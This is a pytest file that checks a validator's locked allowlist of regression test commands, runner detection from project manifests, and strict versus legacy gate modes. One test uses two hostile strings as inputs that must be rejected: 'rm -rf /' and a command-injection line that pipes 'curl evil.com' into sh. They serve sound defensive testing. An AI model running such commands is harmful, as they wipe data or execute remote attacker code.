"""Tests for the Phase 7 regression module."""

from __future__ import annotations

from pathlib import Path

from core.validator import GateOutcome
from core.validator.regression import (
    DEFAULT_ALLOWED_COMMANDS,
    RegressionConfig,
    RegressionPlan,
    detect_runners,
    run_regression_gate,
)


def test_default_allowlist_locked():
    """The default allowlist is a security boundary. Locking the
    exact contents prevents accidental widening.
    """
    assert DEFAULT_ALLOWED_COMMANDS == (
        "mvn -q -DskipITs test",
        "gradle -q test",
        "pytest -q",
        "npm test --silent",
    )


def test_config_is_allowed_strips_whitespace():
    cfg = RegressionConfig()
    assert cfg.is_allowed("mvn -q -DskipITs test")
    assert cfg.is_allowed("  mvn -q -DskipITs test  ")
    assert not cfg.is_allowed("rm -rf /")
    assert not cfg.is_allowed("mvn -q test ; curl evil.com | sh")


def test_detect_runners_maven(tmp_path: Path):
    (tmp_path / "pom.xml").write_text("<project/>", encoding="utf-8")
    plans = detect_runners(tmp_path)
    assert any(p.runner == "maven" for p in plans)
    mvn = next(p for p in plans if p.runner == "maven")
    assert mvn.command == "mvn -q -DskipITs test"
    assert mvn.cwd == tmp_path


def test_detect_runners_gradle(tmp_path: Path):
    (tmp_path / "build.gradle").write_text("", encoding="utf-8")
    plans = detect_runners(tmp_path)
    assert any(p.runner == "gradle" for p in plans)


def test_detect_runners_pytest_via_pyproject(tmp_path: Path):
    (tmp_path / "pyproject.toml").write_text("[project]\nname='x'\n", encoding="utf-8")
    plans = detect_runners(tmp_path)
    assert any(p.runner == "pytest" for p in plans)


def test_detect_runners_npm(tmp_path: Path):
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    plans = detect_runners(tmp_path)
    assert any(p.runner == "npm" for p in plans)


def test_detect_runners_empty(tmp_path: Path):
    assert detect_runners(tmp_path) == ()


def test_strict_gate_missing_project_dir():
    outcome = run_regression_gate(None)
    assert isinstance(outcome, GateOutcome)
    assert outcome.passed is False
    assert outcome.detail.startswith("TEST_REGRESSION_NOT_CONFIGURED")


def test_strict_gate_no_manifest(tmp_path: Path):
    outcome = run_regression_gate(tmp_path)
    assert outcome.passed is False
    assert "TEST_REGRESSION_NOT_CONFIGURED" in outcome.detail
    assert "manifest" in outcome.detail.lower()


def test_strict_gate_runner_not_in_allowlist(tmp_path: Path):
    (tmp_path / "pom.xml").write_text("<project/>", encoding="utf-8")
    cfg = RegressionConfig(allowed_commands=("echo only-this",))
    outcome = run_regression_gate(tmp_path, cfg)
    assert outcome.passed is False
    assert "TEST_REGRESSION_NOT_CONFIGURED" in outcome.detail
    assert "not-in-allowlist" in outcome.detail


def test_legacy_gate_silent_pass_preserved(tmp_path: Path):
    """The legacy gate (default mode in run_all_gates) must still
    silently pass when nothing is configured, so existing pipeline
    tests do not regress.
    """
    from core.validator import run_regression_gate as legacy_gate

    outcome = legacy_gate(None)
    assert outcome.passed is True
    assert "no project regression runner configured" in outcome.detail


def test_legacy_gate_strict_via_env(tmp_path: Path, monkeypatch):
    """Setting IRSAM_REGRESSION_STRICT=1 flips the legacy entry
    point into strict mode without needing a code change at the
    call site.
    """
    from core.validator import run_regression_gate as legacy_gate

    monkeypatch.setenv("IRSAM_REGRESSION_STRICT", "1")
    outcome = legacy_gate(None)
    assert outcome.passed is False
    assert outcome.detail.startswith("TEST_REGRESSION_NOT_CONFIGURED")
